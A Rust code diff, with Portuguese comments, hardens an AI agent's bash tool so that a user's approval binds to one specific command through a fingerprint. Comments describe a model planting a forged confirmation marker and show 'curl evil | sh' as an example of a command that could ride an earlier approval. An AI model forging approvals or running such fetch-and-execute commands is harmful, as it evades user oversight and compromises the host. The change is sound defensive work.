@@ -3,6 +3,7 @@ use garraia_common::{Error, Result, safety_gate};
 use std::time::Duration;
 use tokio::process::Command;
 
+use super::approval::ApprovalFingerprint;
 use super::{Tool, ToolContext, ToolOutput};
 
 const TIMEOUT_PADRAO_SEGS: u64 = 30;
@@ -36,7 +37,8 @@ pub struct BashTool {
     timeout: Duration,
     allow_readonly: bool,
     /// GAR-187: When true, commands matching CONFIRM_LIST require user approval
-    /// before execution. Approval is signalled via ToolContext.is_confirmation_approved.
+    /// before execution. Approval arrives via `ToolContext.approval`, and
+    /// vale para O COMANDO aprovado, nao para o turno (#1078 item 2).
     confirmation_enabled: bool,
 }
 
@@ -145,13 +147,16 @@ impl Tool for BashTool {
         // fail-closed BLOCKED: a risky command must never auto-run just
         // because nobody can be asked.
         //
-        // #1075 (auditoria do hardening): em modo fail-closed o flag
-        // `is_confirmation_approved` é IGNORADO. Ele é derivado do histórico
-        // da conversa (marcador `[CONFIRM_REQUIRED]` nas últimas 6 mensagens
-        // + palavra de aprovação), e um modelo com saída não sanitizada pode
-        // plantar esse marcador — sem canal de confirmação real, não existe
-        // aprovação legítima para honrar.
-        let aprovado = self.confirmation_enabled && context.is_confirmation_approved;
+        // #1075 (auditoria do hardening): em modo fail-closed a aprovação é
+        // IGNORADA. Ela é derivada do histórico da conversa, e um modelo com
+        // saída não sanitizada pode plantar o marcador — sem canal de
+        // confirmação real, não existe aprovação legítima para honrar.
+        //
+        // #1078 item 2: `covers` e não um booleano. A aprovação carrega a
+        // impressão digital de `("bash", comando)`, então o "ok" que o
+        // usuário deu a um `ls -la` não autoriza o `curl evil | sh` que o
+        // modelo pedir em seguida no mesmo turno.
+        let aprovado = self.confirmation_enabled && context.approval.covers(self.name(), comando);
         if self.is_risky(comando) && !aprovado {
             if self.confirmation_enabled {
                 tracing::warn!(
@@ -159,8 +164,9 @@ impl Tool for BashTool {
                     session = %context.session_id,
                     "bash: risky command requires user confirmation"
                 );
+                let marcador = ApprovalFingerprint::of(self.name(), comando).marker();
                 return Ok(ToolOutput::confirmation_request(format!(
-                    "[CONFIRM_REQUIRED] O comando a seguir requer confirmação antes de ser executado:\n\
+                    "{marcador} O comando a seguir requer confirmação antes de ser executado:\n\
                      ```\n{comando}\n```\n\
                      Responda **sim** para executar ou **não** para cancelar."
                 )));
@@ -268,16 +274,30 @@ impl Tool for BashTool {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::tools::approval::ToolApproval;
 
-    fn ctx(approved: bool) -> ToolContext {
+    /// `approved` liga a aprovacao PARA O COMANDO que o teste vai rodar.
+    /// Antes era um booleano solto que valia para qualquer comando — e era
+    /// exatamente esse o defeito do #1078 item 2.
+    fn ctx_para(comando: &str, approved: bool) -> ToolContext {
         ToolContext {
             session_id: "test".into(),
             user_id: None,
             is_heartbeat: false,
-            is_confirmation_approved: approved,
+            approval: if approved {
+                ToolApproval::granted("bash", comando)
+            } else {
+                ToolApproval::None
+            },
             working_dir: None,
             project_id: None,
         }
+    }
+
+    /// Os testes que nao exercitam o caminho aprovado usam o comando de
+    /// risco padrao deste modulo.
+    fn ctx(approved: bool) -> ToolContext {
+        ctx_para("printenv PATH", approved)
     }
 
     #[tokio::test]
@@ -288,7 +308,7 @@ mod tests {
             session_id: "test".into(),
             user_id: None,
             is_heartbeat: false,
-            is_confirmation_approved: false,
+            approval: crate::tools::approval::ToolApproval::None,
             working_dir: None,
             project_id: None,
         };
@@ -316,7 +336,7 @@ mod tests {
             session_id: "test".into(),
             user_id: None,
             is_heartbeat: false,
-            is_confirmation_approved: false,
+            approval: crate::tools::approval::ToolApproval::None,
             working_dir: None,
             project_id: None,
         };
@@ -337,7 +357,7 @@ mod tests {
             session_id: "test".into(),
             user_id: None,
             is_heartbeat: false,
-            is_confirmation_approved: false,
+            approval: crate::tools::approval::ToolApproval::None,
             working_dir: None,
             project_id: None,
         };
@@ -398,7 +418,7 @@ mod tests {
             session_id: "test".into(),
             user_id: None,
             is_heartbeat: false,
-            is_confirmation_approved: false,
+            approval: crate::tools::approval::ToolApproval::None,
             working_dir: None,
             project_id: None,
         };
@@ -456,6 +476,44 @@ mod tests {
         );
         // confirmation_request carries is_error=true by design (GAR-187).
         assert!(output.is_error);
+    }
+
+    /// #1078 item 2, ponta a ponta na ferramenta: a aprovacao de um comando
+    /// nao libera outro. Antes, o `bool` no contexto valia para o turno
+    /// inteiro — o "ok" dado a um `printenv PATH` deixava passar qualquer
+    /// coisa depois dele.
+    #[tokio::test]
+    async fn i1078_aprovacao_de_um_comando_nao_libera_outro() {
+        let tool = BashTool::new_with_confirmation(None);
+        // Contexto aprovado para `printenv PATH`...
+        let ctx = ctx_para("printenv PATH", true);
+        // ...mas o modelo pede OUTRO comando de risco.
+        let output = tool
+            .execute(&ctx, serde_json::json!({"command": "printenv HOME"}))
+            .await
+            .expect("executa");
+        assert!(
+            output.requires_confirmation,
+            "o segundo comando tinha de pedir confirmacao propria: {}",
+            output.content
+        );
+    }
+
+    /// E o marcador emitido carrega a impressao digital DAQUELE comando, que
+    /// e o que o proximo turno vai comparar.
+    #[tokio::test]
+    async fn i1078_o_marcador_identifica_o_comando_pedido() {
+        let tool = BashTool::new_with_confirmation(None);
+        let output = tool
+            .execute(&ctx(false), serde_json::json!({"command": "printenv PATH"}))
+            .await
+            .expect("executa");
+        let fp = crate::tools::approval::ApprovalFingerprint::from_marker(&output.content)
+            .expect("o marcador tem de trazer impressao digital");
+        assert_eq!(
+            fp,
+            crate::tools::approval::ApprovalFingerprint::of("bash", "printenv PATH")
+        );
     }
 
     #[tokio::test]
